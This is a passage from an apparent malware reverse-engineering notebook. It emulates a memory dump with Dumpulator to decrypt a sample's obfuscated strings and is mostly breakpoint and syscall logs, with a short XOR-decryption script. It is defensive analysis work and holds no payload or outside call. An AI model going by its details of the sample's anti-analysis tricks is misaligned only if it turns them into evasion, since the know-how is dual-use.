PAGE_READWRITE status = 0 syscall: ZwAccessCheck( SECURITY_DESCRIPTOR* SecurityDescriptor = 0xffffffff, HANDLE ClientToken = 0x19fb1c, ACCESS_MASK DesiredAccess = 0x19fb20, GENERIC_MAPPING* GenericMapping = 0x4, PRIVILEGE_SET* PrivilegeSet = 0x19fb24, ULONG* PrivilegeSetLength = 0x770f9000, ACCESS_MASK* GrantedAccess = 0x2378, NTSTATUS* AccessStatus = 0x2 ) status = 0 syscall: ZwProtectVirtualMemory( HANDLE ProcessHandle = 0xffffffff /* NtCurrentProcess() */, PVOID* BaseAddress = 0x19fb1c, SIZE_T* RegionSize = 0x19fb20, ULONG NewProtect = 0x2, ULONG* OldProtect = 0x19fb24 ) protect 0x770f9000[0x3000] = PAGE_READONLY status = 0 syscall: ZwAccessCheck( SECURITY_DESCRIPTOR* SecurityDescriptor = 0xffffffff, HANDLE ClientToken = 0x19fb1c, ACCESS_MASK DesiredAccess = 0x19fb20, GENERIC_MAPPING* GenericMapping = 0x2, PRIVILEGE_SET* PrivilegeSet = 0x19fb24, ULONG* PrivilegeSetLength = 0x770f9000, ACCESS_MASK* GrantedAccess = 0x2378, NTSTATUS* AccessStatus = 0x4 ) status = 0 emulation finished, cip = 4404a7 . fn_get_string = 0x017DE0 + base buff = dp.allocate(4096) dp.call(fn_get_string, [buff]) . emu_start(457de0, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457de1, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457df2 emu_start(457df2, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457df7, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457e00 emu_start(457e00, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457e07, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457e17 emu_start(457e17, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457e24, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457e29 emu_start(457e29, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457e3a, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457e4c emu_start(457e4c, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457e4d, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457e52 emu_start(457e52, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457e5d, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457e67 emu_start(457e67, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457e72, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457e85 emu_start(457e85, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457e90, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457e97 emu_start(457e97, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457e98, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457eaa emu_start(457eaa, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457e98, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457eaa emu_start(457eaa, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457e98, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457eaa emu_start(457eaa, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457eb4, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457ebe emu_start(457ebe, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457ec0, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457ece emu_start(457ece, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457ed5, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457edd emu_start(457edd, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457ede, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457ee4 emu_start(457ee4, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457eeb, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457ef1 emu_start(457ef1, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457efe, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457f0d emu_start(457f0d, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457f0e, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457f21 emu_start(457f21, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457f36, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457f49 emu_start(457f49, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457f54, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457f5d emu_start(457f5d, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457f68, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457f7c emu_start(457f7c, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457f7d, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457f8d emu_start(457f8d, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457f8e, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457f97 emu_start(457f97, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457f98, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457fa8 emu_start(457fa8, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457f98, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457fa8 emu_start(457fa8, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457f98, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457fa8 emu_start(457fa8, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457fb3, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457fb7 emu_start(457fb7, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457fbe, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457fcb emu_start(457fcb, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457fcc, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457fcf emu_start(457fcf, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457fd6, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x457fe8 emu_start(457fe8, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 457ff5, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x458000 emu_start(458000, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 458007, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x458011 emu_start(458011, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 45801c, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x45802c emu_start(45802c, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 458032, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x458044 emu_start(458044, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 4580b8, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x4580c9 emu_start(4580c9, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 4580d2, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x4580d8 emu_start(4580d8, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 4580df, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x4580ea emu_start(4580ea, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 4580f7, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x4580fd emu_start(4580fd, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 458104, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x458118 emu_start(458118, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 458125, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x458129 emu_start(458129, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 45812a, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x458131 emu_start(458131, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 458138, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x45813b emu_start(45813b, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 458142, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x458148 emu_start(458148, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 45814f, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x45815c emu_start(45815c, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 458163, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x458172 emu_start(458172, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 45817f, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x458186 emu_start(458186, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 458193, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x4581a4 emu_start(4581a4, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 4581a5, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x4581b7 emu_start(4581b7, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 4581be, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x4581d0 emu_start(4581d0, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 4581d7, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x4581ea emu_start(4581ea, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 4581ff, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x458203 emu_start(458203, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 45820e, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x458216 emu_start(458216, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 458217, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x458224 emu_start(458224, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 45822f, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x458233 emu_start(458233, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 458234, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x458247 emu_start(458247, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 458251, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x458255 emu_start(458255, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 458257, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x458268 emu_start(458268, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 45826f, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x458279 emu_start(458279, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 45827a, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x458280 emu_start(458280, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 458287, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x458290 emu_start(458290, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 45829d, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x4582a3 emu_start(4582a3, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 4582bb, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x4582cc emu_start(4582cc, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 4582cd, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x4582d2 emu_start(4582d2, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 4582d9, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x4582e4 emu_start(4582e4, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 4582ed, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x4582f5 emu_start(4582f5, 5000, 0) interrupt 3 (#BP, Breakpoint), cip = 4582f6, cs = 23 handling exception... old csp: 19fb74, new csp: 19f6bc emu_start(77044ec0, 5000, 0) syscall: ZwContinue( PVOID ContextRecord = 0x19f714, BOOLEAN TestAlert = 0x0 ) context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 switching context, cip: 0x458302 emu_start(458302, 5000, 0) emulation finished, cip = 5000 . 4838920 . out_buff_len = dp.read_long(buff) out_buff = dp.read(buff+4, out_buff_len) out_buff . bytearray(b&#39;TOnm xf6_, xcb x8d x84: x9a xdaW xed x15Bht x91 x19 xe8 xa8)&#39;) . key = bytes.fromhex(&#39;3d4f0b6d845f58cbf8844e9ab35781156c68109175e8c42901f8ee2b78c4926631939c778b2a48e0d8ea0dd585&#39;) . def xor_crypt(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i % len(key)]) return bytes(out) xor_crypt(out_buff, key).decode(&#39;utf-16&#39;) . &#39;iertutil.dll&#39; . fn_decrypt = 0x00025A28 + base dp.call(fn_decrypt, [buff]) . emu_start(465a28, 5000, 0) emulation finished, cip = 5000 . 4838920 . dp.read(buff+4, out_buff_len).decode(&#39;utf-16&#39;) . &#39;iertutil.dll&#39; . str_fn_list = [0x254d4, 0x1644a, 0x147f1, 0x1607f, 0x1d6a4, 0x1be3d, 0x1babc, 0x1836d, 0x8a55, 0x8d44, 0x670f, 0x4270, 0xac35, 0xaab1, 0x8f89, 0x9d9c, 0x1d9d3, 0x14d18, 0x18aa1, 0x19765, 0x1a31c, 0x1ae60, 0x17571, 0x18f33, 0x192f4, 0x17de0, 0x15b41, 0x14d35, 0x167d4, 0x171af, 0x16e4f, 0x1cf67, 0x1c943, 0x17aa1] # for str_fn in str_fn_list: # try: # print(decrypt(str_fn)) # except: # pass def emu_restart(): global dp # Load the emulator dp = Dumpulator(&quot;/tmp/gudump.dmp&quot;, quiet=True) # Load the VEH veh_stop_addr = 0x04A7 + base dp.start(0x440000, end=veh_stop_addr) def emu_decrypt(fn_addr): global dp buff = dp.allocate(4096) fn_get_string = fn_addr + base try: dp.call(fn_get_string, [buff]) out_buff_len = dp.read_long(buff) dp.call(fn_decrypt, [buff]) out_buff = dp.read(buff+4, out_buff_len) return out_buff.replace(b&#39; x00&#39;,b&#39;&#39;).decode(&#39;utf-8&#39;) except: emu_restart() return &#39;&#39; emu_restart() out_strs = [] for str_fn in str_fn_list: out_strs.append(emu_decrypt(str_fn)) . protect 0x770f9000[0x3000] = PAGE_READWRITE protect 0x770f9000[0x3000] = PAGE_READONLY initial unsupported access UC_MEM_WRITE_PROT of 1a0000[1] = 465B39, cip = 4654a4 protect 0x770f9000[0x3000] = PAGE_READWRITE protect 0x770f9000[0x3000] = PAGE_READONLY interrupt 3 (#BP, Breakpoint), cip = 45644f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45645b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45646f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45647b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45648a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4564a4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), 